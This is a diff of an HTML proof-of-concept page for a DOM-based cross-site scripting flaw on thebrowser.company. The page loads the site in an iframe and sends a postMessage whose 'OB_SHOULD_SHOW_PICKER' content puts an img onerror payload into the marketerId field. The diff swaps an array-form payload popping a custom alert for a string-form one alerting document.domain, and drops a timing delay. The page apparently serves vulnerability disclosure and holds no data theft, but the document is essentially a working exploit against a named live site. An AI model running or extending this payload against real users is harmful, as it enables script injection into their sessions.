@@ -1,34 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>✅ XSS PoC – thebrowser.company</title>
-</head>
-<body>
-  <h2>🚀 DOM XSS via postMessage (marketerId)</h2>
-  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border: 2px solid lime;"></iframe>
+  <head>
+    <title>✅ PoC - alert XSS in thebrowser.company</title>
+  </head>
+  <body>
+    <h2>✅ DOM XSS PoC - alert version</h2>
+    <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border:2px solid black;"></iframe>
 
-  <script>
-    const iframe = document.getElementById("target");
+    <script>
+      const iframe = document.getElementById("target");
 
-    iframe.onload = () => {
-      console.log("✅ iframe loaded");
+      iframe.onload = () => {
+        console.log("✅ iframe loaded");
 
-      // Payload: uses marketerId which is used in OB_SHOULD_SHOW_PICKER
-      const payload = {
-        message: "OB_SHOULD_SHOW_PICKER",
-        content: {
-          marketerId: [
-            `<img src=x onerror=alert('🔥 XSS via marketerId')>`
-          ]
-        }
-      };
+        const payload = {
+          message: "OB_SHOULD_SHOW_PICKER",
+          content: {
+            marketerId: `<img src='x' onerror='alert(document.domain)'>`
+          }
+        };
 
-      setTimeout(() => {
+        console.log("🚀 Sending XSS payload...");
         iframe.contentWindow.postMessage(payload, "*");
-        console.log("🚀 Payload sent via postMessage");
-      }, 2000); // delay to ensure iframe content is ready
-    };
-  </script>
-</body>
+      };
+    </script>
+  </body>
 </html>
